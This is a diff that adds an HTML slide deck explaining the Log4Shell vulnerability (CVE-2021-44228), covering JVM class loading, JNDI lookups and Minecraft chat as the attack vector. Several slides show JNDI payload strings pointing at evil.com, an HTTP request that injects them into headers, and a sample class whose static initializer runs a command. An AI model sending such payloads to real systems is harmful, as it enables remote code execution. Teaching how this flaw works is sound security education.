@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log4Shell — From Chat Message to RCE</title>
+
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=IBM+Plex+Mono:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/monokai.min.css">
+
+<style>
+:root {
+    --bg: #0a0a0a;
+    --text: #b8b8b8;
+    --green: #39ff14;
+    --green-dim: rgba(57,255,20,0.15);
+    --orange: #ff6b35;
+    --orange-dim: rgba(255,107,53,0.15);
+    --cyan: #00d4ff;
+    --cyan-dim: rgba(0,212,255,0.15);
+    --yellow: #ffcc00;
+    --yellow-dim: rgba(255,200,0,0.12);
+    --red: #ff3333;
+    --red-dim: rgba(255,51,51,0.15);
+    --dim: #505050;
+    --code-bg: #0f0f1a;
+}
+
+.reveal-viewport { background: var(--bg); }
+
+.reveal {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 22px;
+    color: var(--text);
+}
+
+/* CRT overlay */
+.reveal::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+        repeating-linear-gradient(0deg,
+            transparent 0px, transparent 2px,
+            rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px),
+        radial-gradient(ellipse at center,
+            transparent 50%, rgba(0,0,0,0.5) 100%);
+    pointer-events: none;
+    z-index: 999;
+}
+
+/* Typography */
+.reveal h1, .reveal h2, .reveal h3 {
+    font-family: 'VT323', monospace;
+    color: var(--green);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    text-shadow: 0 0 20px rgba(57,255,20,0.25);
+}
+.reveal h1 { font-size: 3.2em; }
+.reveal h2 { font-size: 1.8em; margin-bottom: 0.6em; }
+.reveal h3 { font-size: 1.3em; text-shadow: none; }
+
+.reveal p, .reveal li { line-height: 1.6; }
+.reveal .dim { color: var(--dim); }
+.reveal .green { color: var(--green); }
+.reveal .orange { color: var(--orange); }
+.reveal .cyan { color: var(--cyan); }
+.reveal .yellow { color: var(--yellow); }
+.reveal .red { color: var(--red); }
+.reveal .bold { font-weight: 600; }
+.reveal section { text-align: left; }
+.reveal section.center-slide { text-align: center; }
+
+/* Code */
+.reveal pre {
+    width: 100%;
+    margin: 0.4em 0;
+    box-shadow: none;
+    font-size: 0.85em;
+}
+.reveal pre code {
+    font-family: 'IBM Plex Mono', monospace;
+    background: var(--code-bg);
+    border: 1px solid #1a1a2e;
+    border-radius: 4px;
+    padding: 0.8em 1em;
+    max-height: 480px;
+}
+
+/* Side-by-side comparison */
+.vs {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.2rem;
+    align-items: start;
+    text-align: left;
+    width: 100%;
+}
+.vs .side { position: relative; }
+.vs .tag {
+    font-family: 'VT323', monospace;
+    font-size: 1.1em;
+    letter-spacing: 0.1em;
+    margin-bottom: 0.3em;
+    display: block;
+}
+
+/* Attack flow diagram */
+.attack-flow {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0;
+    margin: 0.8rem auto;
+    max-width: 900px;
+}
+.flow-step {
+    display: flex;
+    align-items: center;
+    gap: 1em;
+    width: 100%;
+    padding: 0.5em 1em;
+    border-radius: 4px;
+    font-size: 0.88em;
+}
+.flow-step .step-num {
+    font-family: 'VT323', monospace;
+    font-size: 1.4em;
+    min-width: 2em;
+    text-align: center;
+}
+.flow-step .step-desc { flex: 1; }
+.flow-arrow { color: var(--dim); font-size: 0.8em; }
+
+.flow-step.user { border: 1px solid rgba(0,212,255,0.3); background: rgba(0,212,255,0.05); }
+.flow-step.user .step-num { color: var(--cyan); }
+
+.flow-step.log4j { border: 1px solid rgba(255,200,0,0.3); background: rgba(255,200,0,0.05); }
+.flow-step.log4j .step-num { color: var(--yellow); }
+
+.flow-step.net { border: 1px solid rgba(255,107,53,0.3); background: rgba(255,107,53,0.05); }
+.flow-step.net .step-num { color: var(--orange); }
+
+.flow-step.rce { border: 1px solid rgba(255,51,51,0.4); background: rgba(255,51,51,0.08); }
+.flow-step.rce .step-num { color: var(--red); }
+
+/* Stack diagram for JVM */
+.stack-diagram {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0;
+    margin: 0.5rem auto;
+    font-size: 0.85em;
+}
+.stack-frame {
+    border: 1px solid;
+    padding: 0.4em 1.5em;
+    text-align: center;
+    min-width: 180px;
+    border-radius: 3px;
+}
+.stack-arrow { color: var(--dim); font-size: 0.75em; }
+
+/* Pipeline diagram */
+.pipeline {
+    display: grid;
+    grid-template-columns: auto 30px auto 30px auto 30px auto;
+    align-items: center;
+    justify-content: center;
+    gap: 0;
+    margin: 1rem auto;
+    font-size: 0.82em;
+}
+.pipe-box {
+    padding: 0.6em 0.8em;
+    border-radius: 4px;
+    text-align: center;
+}
+.pipe-arrow { text-align: center; color: var(--dim); }
+
+/* Lookup table */
+.lookup-table {
+    font-size: 0.85em;
+    margin: 0.5em 0;
+}
+.lookup-row {
+    display: grid;
+    grid-template-columns: auto 30px 1fr;
+    gap: 0.3em;
+    padding: 0.3em 0;
+    align-items: center;
+    border-bottom: 1px solid #1a1a1a;
+}
+.lookup-row .syntax { font-family: 'IBM Plex Mono', monospace; }
+.lookup-row .arrow { text-align: center; color: var(--dim); }
+
+/* JNDI resolution diagram */
+.jndi-flow {
+    display: grid;
+    grid-template-columns: 1fr 60px 1fr 60px 1fr;
+    align-items: center;
+    gap: 0;
+    margin: 1em auto;
+    max-width: 850px;
+    font-size: 0.82em;
+}
+.jndi-box {
+    padding: 0.7em;
+    border-radius: 6px;
+    text-align: center;
+}
+.jndi-arrow {
+    text-align: center;
+    font-size: 0.9em;
+}
+.jndi-label {
+    font-size: 0.7em;
+    display: block;
+    margin-top: 0.2em;
+}
+
+/* Navigation controls */
+.reveal .controls button { color: var(--green) !important; }
+
+/* Misc */
+.slide-title-sub {
+    color: var(--dim);
+    font-size: 0.6em;
+    letter-spacing: 0.15em;
+    margin-top: 0.5em;
+}
+.big-payload {
+    font-size: 1.15em;
+    color: var(--red);
+    font-family: 'IBM Plex Mono', monospace;
+    background: var(--code-bg);
+    padding: 0.4em 0.8em;
+    border-radius: 4px;
+    border: 1px solid rgba(255,51,51,0.3);
+    display: inline-block;
+    margin: 0.5em 0;
+    word-break: break-all;
+}
+.columns-3 {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 1rem;
+    text-align: center;
+}
+.columns-3 .col {
+    padding: 0.8em;
+    border-radius: 4px;
+}
+</style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<!-- ══════════ INTRO: TITLE ══════════ -->
+<section class="center-slide">
+    <h1>Log4Shell</h1>
+    <p class="slide-title-sub">FROM CHAT MESSAGE TO RCE</p>
+    <p class="dim" style="font-size:0.7em; margin-top:2em">CVE-2021-44228</p>
+</section>
+
+<!-- ══════════ INTRO: MINECRAFT ══════════ -->
+<section class="center-slide">
+    <h2>Has anyone played Minecraft?</h2>
+    <br>
+    <p class="fragment" style="font-size:1.1em">
+        Minecraft <span class="cyan bold">Java Edition</span> is one of the most played games in the world.
+    </p>
+    <p class="fragment" style="margin-top:1em">
+        It's written in Java. It logs events with a library called <span class="yellow bold">Log4j</span>.
+    </p>
+    <p class="fragment dim" style="margin-top:1em; font-size:0.85em">
+        In December 2021, someone figured out you could<br>
+        <span class="red bold">hack any Minecraft server</span> by typing a chat message.
+    </p>
+</section>
+
+<!-- ══════════ INTRO: LOG4J ══════════ -->
+<section>
+    <h2>Have you heard about Log4j?</h2>
+    <p><span class="yellow bold">Log4j</span> &mdash; the most widely used logging library in the Java ecosystem.</p>
+    <ul style="margin-top:0.8em; font-size:0.9em">
+        <li class="fragment">Used by <span class="bold">millions</span> of applications &mdash; from Minecraft to iCloud to Tesla</li>
+        <li class="fragment">A single line of code in Log4j contained one of the worst vulnerabilities ever discovered</li>
+        <li class="fragment">CVSS score: <span class="red bold">10.0 / 10.0</span> &mdash; the maximum</li>
+    </ul>
+    <p class="fragment" style="margin-top:1em">
+        But before we get into the exploit, we need to understand the machine it runs on.
+    </p>
+</section>
+
+<!-- ══════════ BACKGROUND: WHAT IS THE JVM? ══════════ -->
+<section>
+    <h2>What is the JVM?</h2>
+    <p>The <span class="green bold">Java Virtual Machine</span> &mdash; a runtime that executes Java programs.</p>
+    <div class="pipeline fragment" style="margin-top:1.5em">
+        <div class="pipe-box" style="border:1px solid rgba(0,212,255,0.3); background:rgba(0,212,255,0.05);">
+            <span class="cyan bold">Hello.java</span><br>
+            <span class="dim" style="font-size:0.8em">source code</span>
+        </div>
+        <div class="pipe-arrow">&xrarr;</div>
+        <div class="pipe-box" style="border:1px solid rgba(255,200,0,0.3); background:rgba(255,200,0,0.05);">
+            <span class="yellow bold">javac</span><br>
+            <span class="dim" style="font-size:0.8em">compiler</span>
+        </div>
+        <div class="pipe-arrow">&xrarr;</div>
+        <div class="pipe-box" style="border:1px solid rgba(255,107,53,0.3); background:rgba(255,107,53,0.05);">
+            <span class="orange bold">Hello.class</span><br>
+            <span class="dim" style="font-size:0.8em">bytecode</span>
+        </div>
+        <div class="pipe-arrow">&xrarr;</div>
+        <div class="pipe-box" style="border:1px solid rgba(57,255,20,0.3); background:rgba(57,255,20,0.05);">
+            <span class="green bold">JVM</span><br>
+            <span class="dim" style="font-size:0.8em">executes</span>
+        </div>
+    </div>
+    <p class="fragment" style="margin-top:1.2em; font-size:0.88em">
+        <span class="bold">Write once, run anywhere</span> &mdash; the JVM abstracts away the OS and CPU.
+        The same <code>.class</code> file runs on Linux, Windows, macOS.
+    </p>
+    <p class="fragment dim" style="font-size:0.82em; margin-top:0.5em">
+        The JVM also handles memory (garbage collection), security (sandboxing),
+        and <span class="bold">dynamic class loading</span> &mdash; that last one is important.
+    </p>
+</section>
+
+<!-- ══════════ BACKGROUND: BYTECODE EXECUTION ══════════ -->
+<section>
+    <h2>How is bytecode executed?</h2>
+    <p>The JVM is a <span class="green bold">stack-based</span> virtual machine. No registers &mdash; everything goes through the operand stack.</p>
+    <div class="vs fragment" style="margin-top:1em">
+        <div class="side">
+            <span class="tag cyan">JAVA SOURCE</span>
+            <pre><code data-trim class="language-java">
+int a = 2;
+int b = 3;
+int c = a + b;
+            </code></pre>
+        </div>
+        <div class="side">
+            <span class="tag green">JVM BYTECODE</span>
+            <pre><code data-trim class="language-plaintext">
+iconst_2       // push 2
+istore_1       // store in local var 1 (a)
+iconst_3       // push 3
+istore_2       // store in local var 2 (b)
+iload_1        // push a
+iload_2        // push b
+iadd           // pop both, push sum
+istore_3       // store in local var 3 (c)
+            </code></pre>
+        </div>
+    </div>
+    <p class="fragment dim" style="font-size:0.82em; margin-top:0.8em">
+        At first, the JVM <span class="bold">interprets</span> bytecode instruction by instruction.
+        Hot methods get <span class="green bold">JIT-compiled</span> to native machine code by HotSpot.
+    </p>
+</section>
+
+<!-- ══════════ BACKGROUND: DYNAMIC CLASS LOADING ══════════ -->
+<section>
+    <h2>Dynamic Class Loading</h2>
+    <p>The JVM can load new classes <span class="bold">at runtime</span> &mdash; not just from disk.</p>
+    <pre class="fragment"><code data-trim class="language-java">
+// Load a class by name at runtime
+Class&lt;?&gt; cls = Class.forName("com.example.Plugin");
+
+// Instantiate it
+Object obj = cls.getDeclaredConstructor().newInstance();
+    </code></pre>
+    <p class="fragment" style="margin-top:0.8em; font-size:0.88em">
+        Classes can be loaded from:
+    </p>
+    <ul class="fragment" style="font-size:0.85em">
+        <li>The local filesystem (<code>.jar</code> files)</li>
+        <li>Over the network via <span class="orange bold">URLClassLoader</span></li>
+        <li>From a <span class="red bold">remote naming service</span> via JNDI</li>
+    </ul>
+    <p class="fragment" style="margin-top:0.8em">
+        When a class is loaded, its <span class="red bold">static initializer block runs immediately</span>.
+    </p>
+    <pre class="fragment"><code data-trim class="language-java">
+public class Evil {
+    static {
+        // This runs the instant the class is loaded
+        Runtime.getRuntime().exec("calc.exe");
+    }
+}
+    </code></pre>
+</section>
+
+<!-- ══════════ BACKGROUND: CODE AS DATA IN LOG4J ══════════ -->
+<section>
+    <h2>Code as Data</h2>
+    <p>Log4j doesn't just write strings &mdash; it <span class="yellow bold">evaluates</span> them.</p>
+    <p class="fragment" style="margin-top:0.8em; font-size:0.88em">
+        Log4j supports <span class="bold">lookups</span> &mdash; expressions inside log messages
+        that get resolved at log time:
+    </p>
+    <div class="lookup-table fragment" style="margin-top:0.8em">
+        <div class="lookup-row">
+            <span class="syntax yellow">${java:version}</span>
+            <span class="arrow">&xrarr;</span>
+            <span>Java 17.0.1</span>
+        </div>
+        <div class="lookup-row">
+            <span class="syntax yellow">${env:USER}</span>
+            <span class="arrow">&xrarr;</span>
+            <span>root</span>
+        </div>
+        <div class="lookup-row">
+            <span class="syntax yellow">${hostname}</span>
+            <span class="arrow">&xrarr;</span>
+            <span>prod-web-03</span>
+        </div>
+        <div class="lookup-row" style="border-bottom:none;">
+            <span class="syntax red">${jndi:ldap://evil/x}</span>
+            <span class="arrow">&xrarr;</span>
+            <span class="red bold">???</span>
+        </div>
+    </div>
+    <p class="fragment dim" style="font-size:0.82em; margin-top:0.8em">
+        The lookup syntax <code>${prefix:name}</code> treats the logged string
+        as a <span class="bold">template</span> &mdash; part data, part code. And one of those
+        prefixes lets you reach out to the network&hellip;
+    </p>
+</section>
+
+<!-- ══════════ BACKGROUND: JNDI ══════════ -->
+<section>
+    <h2>JNDI &mdash; Java Naming and Directory Interface</h2>
+    <p style="font-size:0.88em">JNDI lets Java programs look up <span class="bold">objects by name</span> from directory services:</p>
+    <div class="columns-3 fragment" style="margin-top:0.8em; font-size:0.82em">
+        <div class="col" style="border:1px solid rgba(0,212,255,0.25); background:rgba(0,212,255,0.05);">
+            <h3 style="color:var(--cyan)">LDAP</h3>
+            <p>Lightweight Directory<br>Access Protocol</p>
+        </div>
+        <div class="col" style="border:1px solid rgba(255,200,0,0.25); background:rgba(255,200,0,0.05);">
+            <h3 style="color:var(--yellow)">RMI</h3>
+            <p>Remote Method<br>Invocation</p>
+        </div>
+        <div class="col" style="border:1px solid rgba(255,107,53,0.25); background:rgba(255,107,53,0.05);">
+            <h3 style="color:var(--orange)">DNS</h3>
+            <p>Domain Name<br>System</p>
+        </div>
+    </div>
+    <pre class="fragment"><code data-trim class="language-java">
+// Normal use: look up a database connection from a directory
+Context ctx = new InitialContext();
+DataSource ds = (DataSource) ctx.lookup("ldap://corp-dir/db-pool");
+    </code></pre>
+    <p class="fragment" style="margin-top:0.6em; font-size:0.88em">
+        But JNDI can also return a <span class="orange bold">Reference</span> &mdash;
+        a pointer to a remote class file that the JVM will <span class="red bold">download and instantiate</span>.
+    </p>
+    <p class="fragment dim" style="font-size:0.82em; margin-top:0.4em">
+        The attacker controls the LDAP server. The LDAP server tells the JVM:
+        <em>"the object you want is a class at <code>http://evil.com/Exploit.class</code>"</em>
+    </p>
+</section>
+
+<!-- ══════════ BACKGROUND: THE CVE ══════════ -->
+<section>
+    <h2>CVE-2021-44228: The Attack</h2>
+    <p style="font-size:0.85em; margin-bottom:0.5em">All it takes is getting Log4j to log a string you control:</p>
+    <div class="attack-flow">
+        <div class="flow-step user fragment">
+            <span class="step-num">1</span>
+            <span class="step-desc">Attacker sends <code class="red">${jndi:ldap://evil.com/x}</code> as input</span>
+        </div>
+        <div class="flow-arrow fragment">&darr;</div>
+        <div class="flow-step log4j fragment">
+            <span class="step-num">2</span>
+            <span class="step-desc">Application logs the input &mdash; Log4j sees <code>${jndi:...}</code> and resolves it</span>
+        </div>
+        <div class="flow-arrow fragment">&darr;</div>
+        <div class="flow-step net fragment">
+            <span class="step-num">3</span>
+            <span class="step-desc">JNDI connects to attacker's LDAP server</span>
+        </div>
+        <div class="flow-arrow fragment">&darr;</div>
+        <div class="flow-step net fragment">
+            <span class="step-num">4</span>
+            <span class="step-desc">LDAP responds: <em>"load class from <code>http://evil.com/Exploit.class</code>"</em></span>
+        </div>
+        <div class="flow-arrow fragment">&darr;</div>
+        <div class="flow-step rce fragment">
+            <span class="step-num">5</span>
+            <span class="step-desc">JVM downloads the class, loads it &mdash; <span class="red bold">static initializer executes</span></span>
+        </div>
+        <div class="flow-arrow fragment">&darr;</div>
+        <div class="flow-step rce fragment">
+            <span class="step-num">6</span>
+            <span class="step-desc"><span class="red bold">Arbitrary code execution</span> &mdash; reverse shell, cryptominer, ransomware, anything</span>
+        </div>
+    </div>
+</section>
+
+<!-- ══════════ BACKGROUND: THE CODE ══════════ -->
+<section>
+    <h2>Where was the bug?</h2>
+    <p style="font-size:0.85em">In Log4j's <code>MessagePatternConverter</code>, roughly:</p>
+    <pre class="fragment"><code data-trim class="language-java">
+// Simplified from the actual Log4j source
+public void format(LogEvent event, StringBuilder buf) {
+    String msg = event.getMessage().getFormattedMessage();
+
+    // Does the message contain ${...}?
+    if (msg.contains("${")) {
+        // Resolve ALL lookup expressions in the message
+        msg = config.getStrSubstitutor().replace(event, msg);
+    }
+
+    buf.append(msg);
+}
+    </code></pre>
+    <p class="fragment" style="margin-top:0.6em; font-size:0.88em">
+        That's it. <span class="bold">User-controlled data</span> is passed through string substitution
+        that supports <span class="red bold">JNDI lookups</span>.
+    </p>
+    <p class="fragment dim" style="font-size:0.82em; margin-top:0.4em">
+        No sanitization. No allowlist. No opt-in. Enabled by default in every Log4j 2.x version
+        from 2013 to December 2021.
+    </p>
+</section>
+
+<!-- ══════════ BACKGROUND: MINECRAFT ══════════ -->
+<section>
+    <h2>Minecraft: Chat &xrarr; RCE</h2>
+    <p style="font-size:0.88em">Minecraft Java Edition uses Log4j. Chat messages are logged.</p>
+    <pre class="fragment"><code data-trim class="language-java">
+// Minecraft server logs every chat message
+LOGGER.info("{} sent message: {}", player.getName(), chatMessage);
+// If chatMessage = "${jndi:ldap://evil.com/x}" ... game over
+    </code></pre>
+    <div class="fragment" style="margin-top:1em">
+        <p style="font-size:0.88em; margin-bottom:0.5em">The attack surface:</p>
+        <div style="display:grid; grid-template-columns:auto 1fr; gap:0.3em 1em; font-size:0.85em;">
+            <span class="orange bold">Server</span>
+            <span>Logs the message &xrarr; server-side RCE</span>
+            <span class="cyan bold">Other clients</span>
+            <span>Render the message in chat &xrarr; client-side RCE</span>
+            <span class="yellow bold">Sign-in screen</span>
+            <span>Player name is logged on join &xrarr; RCE on connect</span>
+        </div>
+    </div>
+    <p class="fragment" style="margin-top:1em">
+        Just <span class="bold">typing in chat</span> could compromise every player on the server.
+    </p>
+    <div class="fragment" style="margin-top:0.8em; text-align:center;">
+        <div class="big-payload">${jndi:ldap://evil.com/pwn}</div>
+    </div>
+</section>
+
+<!-- ══════════ BACKGROUND: WHY SO BAD ══════════ -->
+<section>
+    <h2>Why was this so bad?</h2>
+    <div class="columns-3 fragment">
+        <div class="col" style="border:1px solid rgba(255,51,51,0.3); background:rgba(255,51,51,0.05);">
+            <h3 style="color:var(--red)">Ubiquitous</h3>
+            <p style="font-size:0.8em">Log4j ships in almost every Java application.
+            Servers, embedded devices, cloud services.</p>
+        </div>
+        <div class="col" style="border:1px solid rgba(255,107,53,0.3); background:rgba(255,107,53,0.05);">
+            <h3 style="color:var(--orange)">Trivial</h3>
+            <p style="font-size:0.8em">Exploitation is a single string. No authentication,
+            no prior access, no special tools.</p>
+        </div>
+        <div class="col" style="border:1px solid rgba(255,200,0,0.3); background:rgba(255,200,0,0.05);">
+            <h3 style="color:var(--yellow)">Hidden</h3>
+            <p style="font-size:0.8em">Any input field that gets logged is an attack vector.
+            HTTP headers, form fields, URLs.</p>
+        </div>
+    </div>
+    <pre class="fragment" style="margin-top:1em"><code data-trim class="language-http">
+GET / HTTP/1.1
+Host: target.com
+User-Agent: ${jndi:ldap://evil.com/ua}
+X-Forwarded-For: ${jndi:ldap://evil.com/xff}
+Referer: ${jndi:ldap://evil.com/ref}
+    </code></pre>
+    <p class="fragment dim" style="font-size:0.82em; margin-top:0.6em">
+        Any HTTP header, query parameter, or form field that touches a log statement
+        becomes an entry point. Attackers scanned the entire internet within hours of disclosure.
+    </p>
+</section>
+
+<!-- ══════════ EXAMPLE: PLACEHOLDER ══════════ -->
+<section class="center-slide">
+    <h2>Example</h2>
+    <p class="dim" style="margin-top:1em; font-size:1.1em">
+        Let's build a real exploit.
+    </p>
+    <br>
+    <p class="dim" style="font-size:0.85em">(coming up next)</p>
+</section>
+
+</div><!-- /slides -->
+</div><!-- /reveal -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/highlight.min.js"></script>
+<script>
+    Reveal.initialize({
+        hash: true,
+        transition: 'fade',
+        transitionSpeed: 'default',
+        controls: true,
+        progress: true,
+        center: true,
+        width: 1200,
+        height: 700,
+        plugins: [RevealHighlight]
+    });
+</script>
+</body>
+</html>
